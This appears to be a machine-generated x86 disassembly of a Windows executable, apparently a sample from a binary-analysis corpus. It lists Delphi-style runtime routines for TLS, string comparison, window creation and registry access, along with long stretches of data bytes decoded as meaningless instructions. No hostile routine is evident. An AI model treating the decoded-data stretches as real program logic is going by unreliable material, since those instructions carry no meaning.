je r-xdata
call sub_403118
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013bc
mov [ rw-data ] eax
call sub_4013b4
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403054
call sub_40132c
call sub_405dbc
mov [ rw-data ] eax
call sub_4013b4
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40132c
call sub_405dbc
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013ac
mov [ rw-data ] eax
sub_405f8c
push ebx
call sub_405f84
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405f78
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f70
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f70
sub_405fd0
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405f8c
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_40601c
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405f58
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406010
mov edx rw-data
mov eax ebx
call sub_403cc4
pop ebx
retn
sub_406060
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406085
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40608c
retn
sub_4060d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4060f0
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_40611c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406141
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406148
retn
sub_406166
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
push 0xa004061
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov [ 0xffffffffc08b0048 ] eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
add [ ebx + 0x6425ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
pop esp
mov [ 0xffffffffc08b0048 ] eax
jmp [ EnterCriticalSection@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
add [ ebx + 0x5025ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x6c25ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ CreateEventA@IAT ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
sbb al 0x62
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x6025ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ DeleteCriticalSection@IAT ]
mov eax eax
add ebp [ eax + 0x61 ]
inc eax
add [ ebx + 0x4425ffc0 ] cl
mov [ 0xffffffffc08b0048 ] al
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
sub_406cd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029c4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029b4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029c4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029b4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406e7d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406ea5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406eac
retn
sub_406eb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406edd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ee4
retn
sub_406ef0
push 0xf0004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax + 0x680000ff ] dh
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] dh
xchg esi eax
dec eax
add [ edx + 0x680000ff ] dh
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] dh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] dh
dec eax
add [ ebp + 0x680000ff ] dh
xchg esi eax
dec eax
add [ esi + 0x680000ff ] dh
xchg esi eax
dec eax
add [ edi + 0x680000ff ] dh
xchg esi eax
dec eax
add [ eax + 0x680000ff ] bh
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] bh
xchg esi eax
dec eax
add [ edx + 0x680000ff ] bh
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] bh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] bh
dec eax
add [ ebp + 0x680000ff ] bh
xchg esi eax
dec eax
add [ esi + 0x680000ff ] bh
xchg esi eax
dec eax
add [ edi + 0x680000ff ] bh
xchg esi eax
dec eax
add [ eax + 0x680000ff ] ah
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] ah
xchg esi eax
dec eax
add [ edx + 0x680000ff ] ah
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] ah
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] ah
dec eax
add [ ebp + 0x680000ff ] ah
xchg esi eax
dec eax
add [ esi + 0x680000ff ] ah
xchg esi eax
dec eax
add [ edi + 0x680000ff ] ah
xchg esi eax
dec eax
add [ eax + 0x680000ff ] ch
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] ch
xchg esi eax
dec eax
add [ edx + 0x680000ff ] ch
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] ch
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] ch
dec eax
add [ ebp + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407205
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40720c
retn
sub_407d14
cmc
jl r-xdata
add [ eax ] al
add [ eax ] al
add bh bh
jl r-xdata
cmp eax 0xa2e80000
mov ebx 0x5e5fffff
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
jge r-xdata
pop ebx
retn
call sub_40bc04
call sub_4039b8
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add ch dl
jl r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add ch bl
jl r-xdata
mov eax ebx
call sub_40276c
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add ch ah
jl r-xdata
mov edx ebx
call sub_402bf8
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
add [ eax ] al
add [ eax ] al
add ch ch
jl r-xdata
add [ ebp + edi * 2 + 0x300040 ] bl
add [ eax ] al
inc esp
adc al [ eax ]
xor al 0x34
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d143f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jge r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax - 0x13ffbfcf ] ah
add [ eax ] dh
jge r-xdata
rol [ eax ] cl
and al 0x54
dec ebp
jne r-xdata
add ah ch
sub_407dc4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407df8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
pop edi
pop esi
pop ebx
retn
sub_407e1c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40276c
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402bf8
mov eax esi
pop esi
pop ebx
retn
sub_407e3c
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40278c
call ebx
pop ebx
retn
sub_407e68
push ebx
mov ebx eax
mov eax 0xc
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407e3c
pop ebx
retn
sub_407ea0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40423c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045c8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407edc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40423c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045c8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f18
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407f48
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407f68
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407fbc
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407f68
test eax eax
jne r-xdata
sub_407fe0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40423c
mov ebx eax
mov eax esi
call sub_40443c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40406c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_408014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
mov eax ebx
call sub_40423c
push eax
mov eax ebx
call sub_40443c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_40804c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
mov eax ebx
call sub_40423c
push eax
mov eax ebx
call sub_40443c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_40809c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_4080bc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40423c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f7c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40449c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40810c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40423c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40423c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408170
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408186
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408186
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408186
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4081bc
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408170
mov edx esi
pop eax
call sub_40406c
add esp 0x10
pop esi
retn
sub_4081dc
or cl cl
jne sub_408210
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408210
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408210
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408210
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4082a8
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4081dc
mov edx esi
pop eax
call sub_40406c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4082d0
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408170
mov edx esi
pop eax
call sub_40406c
add esp 0x20
pop esi
retn
xor edx edx
sub_4082f8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c18
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407df8
sub_40834c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c18
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40836c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404dc8
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40838c
mov eax [ rw-data ]
call sub_404ff8
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404ff8
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fd0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fd0
sub_40841c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408084
test al al
je r-xdata
sub_408458
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4097fc
mov edx eax
test dl dl
je r-xdata
call sub_40838c
push ebp
mov eax [ rw-data ]
call sub_405000
mov edx eax
mov eax [ rw-data ]
call sub_40841c
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_405000
mov edx eax
mov eax [ rw-data ]
call sub_40841c
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4084f4
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fd0
call sub_40838c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fd0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fd0
jmp r-xdata
pop esi
pop ebx
retn
sub_408544
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
xor al bl
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
